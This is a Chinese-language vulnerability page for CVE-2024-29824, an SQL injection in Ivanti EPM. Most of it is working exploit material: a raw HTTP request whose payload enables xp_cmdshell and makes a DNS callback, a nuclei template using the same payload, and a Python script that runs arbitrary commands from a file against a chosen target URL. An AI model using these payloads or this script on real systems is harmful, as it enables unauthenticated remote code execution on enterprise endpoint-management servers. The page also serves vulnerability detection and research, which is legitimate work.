## Ivanti-EPM存在SQL注入漏洞(CVE-2024-29824)

Ivanti EPM 2022 SU5 及之前版本存在SQL注入漏洞，该漏洞源于核心服务器中存在 SQL注入漏洞，允许同一网络内的未经身份验证的攻击者执行任意代码。

## poc

```
POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
Host: 
Content-Type: application/soap+xml

<?xml version="1.0" encoding="utf-8"?>
        <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
          <soap12:Body>
            <UpdateStatusEvents xmlns="http://tempuri.org/">
              <deviceID>string</deviceID>
              <actions>
                <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
                  <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup dnslog'--</status>
                </Action>
              </actions>
            </UpdateStatusEvents>
          </soap12:Body>
</soap12:Envelope>
```

![Successfully exploiting using Burp](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406142041752.png)

![notepad running under sqlservr.exe](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406142041169.png)

### nuclei

```yaml
id: CVE-2024-29824

info:
  name: Ivanti EPM SQL Remote Code Execution via SQL Injection
  author: DhiyaneshDK
  severity: critical
  description: |
    An unspecified SQL Injection vulnerability in Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code.
  reference:
    - https://github.com/horizon3ai/CVE-2024-29824
    - https://nvd.nist.gov/vuln/detail/CVE-2024-29824
    - https://forums.ivanti.com/s/article/Security-Advisory-May-2024
    - https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/
  classification:
    cvss-metrics: CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2024-29824
  tags: cve,cve2024,ivanti,epm,sqli,rce

http:
  - raw:
      - |
        POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml
        <?xml version="1.0" encoding="utf-8"?>
        <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
          <soap12:Body>
            <UpdateStatusEvents xmlns="http://tempuri.org/">
              <deviceID>string</deviceID>
              <actions>
                <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
                  <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup {{interactsh-url}}'--</status>
                </Action>
              </actions>
            </UpdateStatusEvents>
          </soap12:Body>
        </soap12:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'application/soap+xml'

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: status
        status:
          - 200
```

### python脚本

```python
import argparse
import requests
import urllib3
import sys
from requests.exceptions import ReadTimeout
urllib3.disable_warnings()

XML_PAYLOAD = """<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UpdateStatusEvents xmlns="http://tempuri.org/">
      <deviceID>string</deviceID>
      <actions>
        <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
          <status>GoodApp=1|md5={}</status>
        </Action>
      </actions>
    </UpdateStatusEvents>
  </soap12:Body>
</soap12:Envelope>
"""

SQLI_PAYLOAD = "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{}'--"


def get_cmd_arrays(cmd_file):
    try:
        with open(cmd_file, 'r') as f:
            cmds = f.read().split('\n')
            cmds = [c for c in cmds if c]
            return cmds
    except Exception as e:
        sys.stderr.write(f'[!] Unexpected error reading cmd file: {e}\n')
    return []

def exploit(url, command):
    h = {'Content-Type': 'application/soap+xml' }
    sqli_payload = SQLI_PAYLOAD.format(command)
    xml_payload = XML_PAYLOAD.format(sqli_payload)
    try:
        r = requests.post(f'{url}/WSStatusEvents/EventHandler.asmx', data=xml_payload, headers=h, verify=False, timeout=30)
        if r.status_code == 200:
            print(f'[+] Successfully sent payload to server')
        else:
            print(f'[-] Unexpected response from server')
    except TimeoutError:
        # Expected to timeout given it keeps connection open for process duration
        pass
    except ReadTimeout:
        # Expected to timeout given it keeps connection open for process duration
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The base URL of the target', required=True)
    parser.add_argument('-c', '--cmd_file', help='The commands to execute blind', type=str, required=True)
    args = parser.parse_args()

    commands = get_cmd_arrays(args.cmd_file)
    for command in commands:
        exploit(args.url, command)
```



## 漏洞来源

- https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/